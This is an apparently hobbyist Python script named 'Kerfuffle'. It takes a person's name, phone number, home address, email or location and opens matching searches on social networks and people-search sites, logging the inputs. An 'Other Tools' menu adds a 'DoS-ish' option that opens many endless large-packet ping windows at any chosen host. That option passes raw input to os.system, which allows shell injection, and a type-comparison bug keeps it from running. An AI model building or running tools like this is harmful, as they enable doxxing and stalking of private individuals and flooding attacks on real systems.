import webbrowser
import time
import os
import abbreviate #omg it's a custom import I'm so good hacker man :sunglasses:

log = open("logs.txt", "a")
log.write("Kerfuffle Opened\n")
while True:
    print("""\033[1;35m
 ____  __.             _____       _____  _____.__           
|    |/ _|____________/ ____\_ ___/ ____\/ ____\  |   ____   
|      <_/ __ \_  __ \   __\  |  \   __\\   __\|  | _/ __ \  
|    |  \  ___/|  | \/|  | |  |  /|  |   |  |  |  |_\  ___/  
|____|__ \___  >__|   |__| |____/ |__|   |__|  |____/\___  > 
        \/   \/                                          \/
©2024 Inf Potentiality""")
    time.sleep(3)
    print("""\033[1;m      
==============================
\033[1;34m
1. Facebook 2. Twitter 3. Whitepages 4. Google 5. UsPhoneLookup 6. Searchpeoplefree 7. Truepeoplesearch  98. Experimental (all services) 
 \033[1;m      
==============================
\033[1;36m    99. About\033[1;33m   100. Other Tools    0. Exit\033[1;m
		""")
    menu: str = input("\033[1;mInput service to lookup?: ")
    
    #Facebook
    if menu == "1":
        log.write("Option Facebook Chosen\n")
        
        while True: 
            
            choose = input("Name or phone number? (num): ")
            if choose == "num":
                log.write("Facebook option 'num' chosen\n")
                
                FBnum = input("Phone number to look up with Facebook?: ")
                log.write(f"Facebook phone number inputted: '{FBnum}'\n")
                print("\033[1;35m\n bet \n")
                webbrowser.open(f"https://www.facebook.com/search/top/?init=quick&q={FBnum}")
                log.write(f"Facebook link opened: 'https://www.facebook.com/search/top/?init=quick&q={FBnum}'\n")
                log.close()
                break
            elif choose == "name":
                FBfirst = input("First name? (if none, press ENTER): ")
                FBlast = input("Last name? (if none, press ENTER): ")
                log.write(f"Facebook name inputted '{FBfirst}' + '{FBlast}'\n")
                FBlocation = input("Do you know the general location of the person? (yes/no): ")
                if FBlocation == "no" or FBlocation == "n":
                    log.write("Facebook location option 'no' chosen\n")
                    print("\033[1;35m\nbet \n")
                    webbrowser.open(f"https://www.facebook.com/search/top/?init=quick&q={FBfirst}+{FBlast}")
                    log.write(f"Facebook link opened: 'https://www.facebook.com/search/top/?init=quick&q={FBfirst}+{FBlast}'\n")
                    log.close()
                    break
                elif FBlocation == "yes" or FBlocation == "y":
                    log.write("Facebook location option 'yes' chosen\n")
                    FBlocation = input("What is the general location of the person?: ")
                    log.write(f"Facebook location inputted '{FBlocation}'\n")
                    print("\033[1;35m\nbet \n")
                    webbrowser.open(f"https://www.facebook.com/search/top/?init=quick&q={FBfirst}+{FBlast}+{FBlocation}")
                    log.write(f"Facebook link opened: 'https://www.facebook.com/search/top/?init=quick&q={FBfirst}+{FBlast}+{FBlocation}'\n")
                    log.close()
                    break
            else: 
                log.write("Invalid input chosen \n")
                print("Invalid Input!")
                time.sleep(1)
    
    #Twitter 
    elif menu == "2":
        while True:
            
            choose = input("Name or phone number? (num): ")
            if choose == "num":
                TWnum = input("Phone number to look up with Twitter?: ")
                print("\033[1;35m\n bet \n")
                webbrowser.open(f"https://twitter.com/search?q={TWnum}")
                break
            elif choose == "name":
                TWfirst = input("First name? (if none, press ENTER): ")
                TWlast = input("Last name? (if none, press ENTER): ")
                print("\033[1;35m\nbet \n")
                webbrowser.open(f"https://twitter.com/search?q={TWfirst}+{TWlast}")
                break
            else: 
                print("Invalid Input!")
                time.sleep(1)
    
    #Whitepages (The GOAT)((even doe free people search is better o algo))
    elif menu == "3":
        while True:
            choose = input("Name or phone number? (num): ")
            if choose == "num":
                WPnum = input("Phone number to look up with Whitepages?: ")
                print("\033[1;35m\nbet \n")
                webbrowser.open(f"https://www.whitepages.com/phone/{WPnum}")
                break
            elif choose == "name":
                WPfirst = input("First name? (if none, press ENTER): ")
                WPlast = input("Last name? (if none, press ENTER): ")
                print("\033[1;35m\nbet \n")
                webbrowser.open(f"https://www.whitepages.com/name/{WPfirst}+{WPlast}")
                break
            else: 
                print("Invalid Input!")
                time.sleep(1)
        
    #Google
    elif menu == "4":
        while True:
            
            choose = input("name, phone number or both? (phone number only is 'num'): ")
            if choose == "name":
                Gfullname = input("Just give me their full name (if none, press ENTER, but that'd be goofy): ")
                Glocation = input("Do you have their general location? (if not, press ENTER): ")
                Goccupation = input("What about their job/occupation? (if none or don't know, press ENTER): ")
                print("\033[1;35m\nbet \n")
                webbrowser.open(f"https://www.google.com/search?q={Gfullname}+{Glocation}+{Goccupation}")
                break
            elif choose == "num": 
                Gnum = input("What is their phone number?: ") 
                print("\033[1;35m\nbet \n") 
                webbrowser.open(f"https://www.google.com/search?q={Gnum}")
            elif choose == "both":
                Gfullname = input("Just give me their full name (if none, press ENTER, but that'd be goofy): ")
                Gnum = input("What is their phone number?: ")
                Glocation = input("Do you have their general location? (if not, press ENTER): ")
                Goccupation = input("What about their job/occupation? (if none or don't know, press ENTER): ")
                print("\033[1;35m\nbet \n")
                webbrowser.open(f"https://www.google.com/search?q={Gfullname}+{Gnum}+{Glocation}+{Goccupation}")
                break
            else: 
                print("Invalid Input!")
                time.sleep(1)
                
    #USPhoneLookup
    elif menu == "5":
        while True:
            
            choose = input("This service is exclusively for phone numbers only located in the United States. Would you like to go back? (yes/no): ")
            if choose == "yes" or choose == "y":
               print("\033[1;35m\nbet \n") 
               break
            elif choose == "no" or choose == "n":
                print("""
                      \033[1;36mPHONE NUMBER INPUT FORMATTING: 
                      -DO NOT use parenthesis for the area code [eg (xxx)-xxx-xxxx]
                      -USE DASHES where applicable
                      -DO NOT not* use dashes
                      EXAMPLE: xxx-xxx-xxxx
                      """)
                UPLnum = input("\033[1;mWhat is the phone number of the person?: ")
                print("\033[1;35m\nbet \n")
                webbrowser.open(f"https://www.usphonebook.com/{UPLnum}")
                break
            else: 
                print("Invalid Input!")
                time.sleep(1)
    #searchpeoplefree
    elif menu == "6":
        while True:
            
            choose = input("name, name and general location, or number? (name and general location is 'both', and number is 'number'): ")
            if choose == "name":
                SPFname = input("name?: ")
                print("\033[1;35m\nbet \n")
                webbrowser.open(f"https://www.searchpeoplefree.com/find/{SPFname}")
                break
            elif choose == "both":
                SPFname = input("name?: ")
                print("by the way the program might tweak if you use something uppercase (fixed but I don't wanna get rid of this print)")
                SPFlocation = input("location? (only the state): ")
                SPFlocation2 = SPFlocation.lower()
                short_state = abbreviate.abbreviate_state(f"{SPFlocation2}")
                SPFcity = input("city/town?: ") 
                print("\033[1;35m\nbet \n")
                webbrowser.open(f"https://www.searchpeoplefree.com/find/{SPFname}/{short_state}/{SPFcity}")
                break
            elif choose == "number":
                SPFnumber = input("what's the number (no dashes or parenthesis for the area code): ")
                print("\033[1;35m\nbet \n")
                webbrowser.open(f"https://www.searchpeoplefree.com/phone-lookup/find/{SPFnumber}")
                break
            else:
                print("Invalid Input!")
                time.sleep(1)
                
    #truepeoplesearch
    elif menu == "7":
        while True:
            
            print("""\033[1;36mCouple things:
                           there are like a TON of options for this one so bear with me here:
                           name, phone, address, and email.
                           make your choice, and since I haven't implemented a way to use multiple at once, just use it multiple times?""")
            choose = input("\033[1;choose: ")
            if choose == "name":
                TPSname = input("put in their full name: ")
                print("\033[1;35m\nbet \n")
                webbrowser.open(f"https://www.truepeoplesearch.com/results?name={TPSname}")
                break
            elif choose == "phone" or choose == "number":
                TPSnumber = input("put in their phone number: ")
                print("\033[1;35m\nbet \n")
                webbrowser.open(f"https://www.truepeoplesearch.com/resultphone?phoneno={TPSnumber}")
                break
            elif choose == "address":
                TPSaddress = input("put in their home address: ")
                print("\033[1;35m\nbet \n")
                webbrowser.open(f"https://www.truepeoplesearch.com/resultaddress?streetaddress={TPSaddress}")
                break
            elif choose == "email":
                TPSemail = input("put in their email address")
                print("\033[1;35m\nbet \n")
                webbrowser.open(f"https://www.truepeoplesearch.com/resultemail?email={TPSemail}")
                break   
            else:
                print("Invalid Input!")
                time.sleep(1)
                
    #The short awaited and very buggy experimental all option
    elif menu == "98":
        print("""
                      \033[1;36mPLEASE NOTE:
                      THIS IS AN EXPERIMENTAL FEATURE, AND THEREFORE MAY BE UNRELIABLE (also it only works for phone numbers so far)
                      """)
        print("""
                      PHONE NUMBER INPUT FORMATTING: 
                      -DO NOT use parenthesis for the area code [eg (xxx)-xxx-xxxx]
                      -USE DASHES where applicable
                      -DO NOT not* use dashes
                      EXAMPLE: xxx-xxx-xxxx
                      """)
        choose = input("\033[1;mStill continue?: ") 
        if choose == "yes" or choose == "y":
            ALLnum = input("What is the person's number?: ")
            webbrowser.open(f"https://www.facebook.com/search/top/?init=quick&q={ALLnum}")
            webbrowser.open(f"https://twitter.com/search?q={ALLnum}")
            webbrowser.open(f"https://www.whitepages.com/phone/{ALLnum}")
            webbrowser.open(f"https://www.google.com/search?q={ALLnum}")
            webbrowser.open(f"https://www.usphonebook.com/{ALLnum}")
        elif choose == "no" or choose == "n":
            print("\033[1;35m\nbet \n") 
            break
        else: 
            print("Invalid Input!")
            time.sleep(1)
            

    #About
    elif menu == "99":
        print("""\033[1;34mOne of the most simplistic and sub-par lookup tools ever made, mostly out of boredom. Input the name and/or number(s) of who you wanna find, and the OSINT gods bestow their knowledege upon thee (if any).\033[1;m""")
        time.sleep(1.5)
        
    #Other Tools
    elif menu == "100":
        print("""\033[0;32m
 __  __                      _          __  __ 
|  \/  |                    | |        / _|/ _|
| \  / | ___  _ __ ___   ___| |_ _   _| |_| |_ 
| |\/| |/ _ \| '__/ _ \ / __| __| | | |  _|  _|
| |  | | (_) | | |  __/ \__ \ |_| |_| | | | |  
|_|  |_|\___/|_|  \___| |___/\__|\__,_|_| |_|  
Still ©2024 Inf Potentiality""")
        time.sleep(3)
        print("""\033[1;m      
==============================
\033[1;34m
1. DoS-ish 2. 
\033[1;m      
==============================
\033[1;36m    99. About\033[1;33m 0. Exit\033[1;m
""")
        while True:
            EXmenu = int(input("\033[1;mInput service to run?: "))
            
            if EXmenu == "1":
                while True:
                    print("This program attempts a Denial of Service attack on whatever target you want.")
                    print("\033[1;33mDISCLAIMER: I am not responsible for misuse of this program. Only use this program with express permission from the person this is used on.")
                    target = input("\033[1;mInput the IP address or the hostname of your target: ")
                    size = int(input("How many bytes of data per ping should be sent? (max 65500): "))
                    if size > 65500 or size <= 0:
                        print("Invalid data size!")
                        time.sleep(1)
                        break
                    times = int(input("How many instances would you like to be ran?: "))
                    for i in range(times):
                        os.system(f"start cmd /k ping {target} -l {size} -t")
                    print("Done")
                    break
                
            #Extra About
            elif EXmenu == "99":
                print("This is a continuation to the unpopular program by me, Kerfuffle. Now instead of JUST info gathering, there are even more sub-par things to do!")
                time.sleep(1.5)
                
            #Extra Exit
            elif EXmenu == "0":
                print("\033[1;34mReturning to menu...")
                time.sleep(1)
                break
            else:
                print("Invalid Input!")
                time.sleep(1)
                
    #Exit
    elif menu == "0":
        print("""\033[1;34mThanks for using this ig!""")
        time.sleep(0.5)
        print("""\033[1;34mClosing...\033[1;m""")
        time.sleep(1)
        break
    else: 
        print("Invalid Input!")
        time.sleep(1)
        
